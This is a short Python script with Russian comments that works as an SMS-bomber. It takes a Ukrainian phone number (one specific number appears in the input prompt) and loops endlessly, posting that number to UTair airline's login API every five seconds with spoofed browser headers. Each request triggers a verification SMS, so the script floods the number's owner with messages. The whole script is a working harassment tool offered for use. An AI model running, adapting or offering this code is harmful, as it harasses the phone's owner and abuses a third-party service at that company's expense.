import requests
import time

print("Привет, ты кто?")
phone = input("Number: +380689300235")
phone = str(phone)
if(phone[0:4] == "+380" and len(phone[1:]) ==12):
    while True:  # Делаем бескоенчный цикл.
        cl = requests.session()
        cl.get('https://b.utair.ru/api/v1/login/')
        rSL = requests.post('https://b.utair.ru/api/v1/login/',
                            headers={"Content-Type": "application/json", "Referer": "https://www.utair.ru/",
                                     "Sec-Fetch-Mode": "cors",
                                     "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36 OPR/64.0.3417.92 (Edition Yx 02)"},
                            json={"login": phone[1:]})  # Отпраялем запрос.
        if rSL.status_code == 200:  # Делаем проверку на результат.
            print("Сообщение от сервиса utAir отправлено.")  # Если результат выполнен
        else:  # Если проверка не пройдена
            print("Сообщение от сервиса utAir не отправлено.")
        time.sleep(5)  # Задержка
else:
    print("Number noup")